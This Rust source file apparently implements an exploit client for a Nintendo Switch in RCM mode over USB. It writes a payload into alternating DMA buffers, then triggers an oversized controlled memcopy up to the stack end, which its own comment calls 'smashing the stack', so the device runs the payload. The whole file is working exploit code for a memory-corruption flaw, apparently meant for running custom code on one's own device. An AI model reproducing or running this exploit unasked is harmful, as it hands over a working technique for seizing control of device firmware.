use std::ops::DerefMut;

use crate::Error;

use crate::device::{SwitchDevice, SwitchDeviceUninit};
use crate::vulnerability::Vulnerability;
use crate::Payload;

/// The current state of the Buffer
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BufferState {
    High,
    Low,
}

impl BufferState {
    /// Toggle the buffer
    fn toggle(&mut self) {
        match self {
            BufferState::High => *self = BufferState::Low,
            BufferState::Low => *self = BufferState::High,
        }
    }

    /// Gets the address of the buffer
    fn address(&self) -> usize {
        const COPY_BUFFER_ADDRESSES_LOW: usize = 0x40005000;
        const COPY_BUFFER_ADDRESSES_HIGH: usize = 0x40009000;
        match *self {
            BufferState::Low => COPY_BUFFER_ADDRESSES_LOW,
            BufferState::High => COPY_BUFFER_ADDRESSES_HIGH,
        }
    }
}

/// An RCM connection object
/// This is the main interface to communicate with the switch
#[derive(Debug)]
pub struct Rcm {
    switch: SwitchDevice,
    current_buffer: BufferState,
    _total_written: usize,
}

impl Rcm {
    /// Finds and connects to a device in RCM mode
    /// This will error out if no device is connected unless wait: true is passed
    /// If wait: true is passed this will block until it detects an rcm device
    pub fn new(wait: bool) -> Result<Self, Error> {
        let switch = SwitchDeviceUninit::default().find_device(wait)?;

        Ok(Self {
            switch,
            current_buffer: BufferState::Low,
            _total_written: 0,
        })
    }

    /// This will execute the payload on the connected device
    /// NOTE: Must first read the device id, or else this will fail
    pub fn execute(&mut self, payload: &Payload) -> Result<(), Error> {
        self.write(payload.data())?;
        self.switch_to_highbuf()?;

        // smashing the stack

        let res = self.trigger_controlled_memcopy();
        // We expect a timeout
        if let Err(err) = res {
            if err == Error::UsbError(rusb::Error::Timeout) {
                return Ok(());
            }
        }
        Err(Error::RcmExpectedError)
    }

    /// Writes data to the RCM protocol endpoint
    fn write(&mut self, buf: &[u8]) -> Result<usize, Error> {
        const PACKET_SIZE: usize = 0x1000;
        const MAX_LENGTH: usize = 0x30298;

        assert!(buf.len() <= MAX_LENGTH);

        let mut remaining_buf = buf;
        let mut length_remaining = buf.len();

        let mut written = 0;

        while length_remaining != 0 {
            let data_to_transmit = length_remaining.min(PACKET_SIZE);
            length_remaining -= data_to_transmit;

            let chunk = &remaining_buf[..data_to_transmit];
            remaining_buf = &remaining_buf[data_to_transmit..];
            match self.write_buffer(chunk) {
                Ok(size) => written += size,
                Err(e) => return Err(e.into()),
            };
        }

        Ok(written)
    }

    fn current_buff_addr(&self) -> usize {
        self.current_buffer.address()
    }

    fn switch_to_highbuf(&mut self) -> Result<(), Error> {
        if self.current_buffer != BufferState::High {
            let buf = &[b'\0'; 0x1000];
            self.write(buf)?;
        }
        Ok(())
    }

    fn trigger_controlled_memcopy(&self) -> Result<(), Error> {
        const STACK_END: usize = 0x40010000;
        let length = STACK_END - self.current_buff_addr();
        self.trigger_controlled_memcopy_length(length)?;
        Ok(())
    }

    fn trigger_controlled_memcopy_length(&self, length: usize) -> Result<(), Error> {
        self.switch.trigger(length)?;
        Ok(())
    }

    fn write_buffer(&mut self, buf: &[u8]) -> rusb::Result<usize> {
        self.toggle_buffer();
        self.switch.write(buf)
    }

    fn toggle_buffer(&mut self) {
        self.current_buffer.toggle();
    }

    /// Read from the device
    fn read(&mut self, buf: &mut [u8]) -> rusb::Result<usize> {
        self.switch.read(buf)
    }

    /// Reads the device ID
    /// Note: The is a necessary step before excuting
    pub fn read_device_id(&mut self) -> Result<Box<[u8; 16]>, Error> {
        let mut buf = Box::new([b'\0'; 16]);
        self.read(buf.deref_mut())?;
        Ok(buf)
    }
}
